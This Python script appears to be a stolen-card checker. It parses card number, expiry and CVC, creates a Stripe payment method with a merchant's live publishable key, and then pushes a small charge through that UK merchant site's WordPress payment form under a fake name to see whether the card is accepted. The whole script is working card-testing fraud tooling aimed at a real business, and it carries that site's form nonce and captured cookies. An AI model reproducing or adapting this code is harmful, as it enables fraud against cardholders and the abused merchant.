import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 9)
	random2 = random.randint(1, 99)
	random3 = random.randint(20, 999)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fd50036e08e%3B+stripe-js-v3%2Fd50036e08e%3B+card-element&referrer=https%3A%2F%2Fprestoexperts.co.uk&time_on_page=197360&client_attribution_metadata[client_session_id]=dafb8cf2-6039-407c-a732-b61af7a0c4a3&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=aa8c6339-1fdd-4acf-91fd-1f0a4a900817&key=pk_live_51R9UlOKQFeM7cCO7ZfILbJgF3uRmlavIvnrqSJD23CFrNgO5D4FfleyxQ5l2fcibXeyXEyEybjYvbGvKGq6LHWLp00uU0Ig4HU'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    'nitroCachedPage': '1',
	    '_ga': 'GA1.1.492996798.1775645249',
	    '_fbp': 'fb.2.1775645249712.111751280529701754',
	    'twk_idm_key': 'LROE1Bwo-Yw4y6LSQZgRF',
	    'TawkConnectionTime': '0',
	    'twk_uuid_6592b1cd8d261e1b5f4df048': '%7B%22uuid%22%3A%221.2U6rV6NfQyvxci41IxlUshiYoZdzzuG58YReauJvk4ixinaQVJ1EudXwFFDG0DaCPUTDCEu6oqVHxhlm6WaMISKA1vM22gZjf9dJNoEw0KDES69zJ2kL3KD7NDAE7HP%22%2C%22version%22%3A3%2C%22domain%22%3A%22prestoexperts.co.uk%22%2C%22ts%22%3A1775645357532%7D',
	    '_ga_WSPEEEVSXG': 'GS2.1.s1775645248$o1$g1$t1775645445$j7$l0$h0',
	}
	
	headers = {
	    'authority': 'prestoexperts.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'nitroCachedPage=1; _ga=GA1.1.492996798.1775645249; _fbp=fb.2.1775645249712.111751280529701754; twk_idm_key=LROE1Bwo-Yw4y6LSQZgRF; TawkConnectionTime=0; twk_uuid_6592b1cd8d261e1b5f4df048=%7B%22uuid%22%3A%221.2U6rV6NfQyvxci41IxlUshiYoZdzzuG58YReauJvk4ixinaQVJ1EudXwFFDG0DaCPUTDCEu6oqVHxhlm6WaMISKA1vM22gZjf9dJNoEw0KDES69zJ2kL3KD7NDAE7HP%22%2C%22version%22%3A3%2C%22domain%22%3A%22prestoexperts.co.uk%22%2C%22ts%22%3A1775645357532%7D; _ga_WSPEEEVSXG=GS2.1.s1775645248$o1$g1$t1775645445$j7$l0$h0',
	    'origin': 'https://prestoexperts.co.uk',
	    'referer': 'https://prestoexperts.co.uk/pay/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1775645453440',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=4269&_fluentform_13_fluentformnonce=bcf0ac21b6&_wp_http_referer=%2Fpay%2F&name=Rodam%20User&email_address=rodamuser03%40gmail.com&custom-payment-amount=1&payment-coupon=&payment_for=General&payment_method=stripe&__ff_all_applied_coupons=&__entry_intermediate_hash=47953d1f162b590781fb9495de449681&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '13',
	}
	
	response = requests.post(
	    'https://prestoexperts.co.uk/wp-admin/admin-ajax.php',
	    params=params,
	    #cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return response.text
